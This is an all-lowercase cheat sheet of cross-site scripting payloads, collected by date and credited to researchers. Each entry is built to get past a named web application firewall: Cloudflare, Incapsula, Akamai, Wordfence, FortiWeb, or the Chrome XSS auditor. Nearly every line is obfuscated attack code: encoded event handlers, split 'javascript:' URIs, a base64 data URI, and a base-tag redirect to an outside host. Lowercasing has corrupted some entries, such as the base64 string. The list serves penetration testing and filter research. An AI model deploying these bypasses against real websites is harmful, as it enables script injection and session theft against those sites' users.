# common waf bypass

> wafs are designed to filter out malicious content by inspecting incoming and outgoing traffic for patterns indicative of attacks. despite their sophistication, wafs often struggle to keep up with the diverse methods attackers use to obfuscate and modify their payloads to circumvent detection. 


## summary

* [cloudflare](#cloudflare)
* [chrome auditor](#chrome-auditor)
* [incapsula waf](#incapsula-waf)
* [akamai waf](#akamai-waf)
* [wordfence waf](#wordfence-waf)
* [fortiweb waf](#fortiweb-waf)


## cloudflare

* 25st january 2021 - [@bohdan korzhynskyi](https://twitter.com/bohdansec)
    ```js
    <svg/onrandom=random onload=confirm(1)>
    <video onnull=null onmouseover=confirm(1)>
    ```

* 21st april 2020 - [@bohdan korzhynskyi](https://twitter.com/bohdansec)
    ```js
    <svg/onload="`${prompt``}`">
    ```

* 22nd august 2019 - [@bohdan korzhynskyi](https://twitter.com/bohdansec)
    ```js
    <svg/onload=%26nbsp;alert`bohdan`+
    ```

* 5th june 2019 - [@bohdan korzhynskyi](https://twitter.com/bohdansec)
    ```js
    1'"><img/src/onerror=.1|alert``>
    ```

* 3rd june 2019 - [@bohdan korzhynskyi](https://twitter.com/bohdansec)
    ```js
    <svg onload=prompt%26%230000000040document.domain)>
    <svg onload=prompt%26%23x000000028;document.domain)>
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
    ```

* 22nd march 2019 - @rakeshmane10
    ```js
    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
    ```

* 27th february 2018
    ```html
    <a href="j&tab;a&tab;v&tab;asc&newline;ri&tab;pt&colon;&lpar;a&tab;l&tab;e&tab;r&tab;t&tab;(document.domain)&rpar;">x</a>
    ```

## chrome auditor

note: chrome auditor is deprecated and removed on latest version of chrome and chromium browser.

* 9th august 2018
    ```javascript
    </script><svg><script>alert(1)-%26apos%3b
    ```


## incapsula waf

* 11th may 2019 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)
    ```js
    <svg onload\r\n=$.globaleval("al"+"ert()");>
    ```

* 8th march 2018 - [@alra3ees](https://twitter.com/alra3ees/status/971847839931338752)
    ```javascript
    anythinglr00</script><script>alert(document.domain)</script>uxldz
    anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
    ```

* 11th september 2018 - [@c0d3g33k](https://twitter.com/c0d3g33k)
    ```javascript
    <object data='data:text/html;;;;;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg=='></object>
    ```


## akamai waf

* 18th june 2018 - [@zseano](https://twitter.com/zseano)
    ```javascript
    ?"></script><base%20c%3d=href%3dhttps:\mysite>
    ```

* 28th october 2018 - [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480)
    ```svg
    <details%0aopen%0aontoggle%0a=%0aa=prompt,a() x>
    ```


## wordfence waf

* 12th september 2018 - [@brutelogic](https://twitter.com/brutelogic)
    ```html
    <a href=javas&#99;ript:alert(1)>
    ```

## fortiweb waf

* 9th july 2019 - [@rezaduty](https://twitter.com/rezaduty)
    ```javascript
    \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
    ```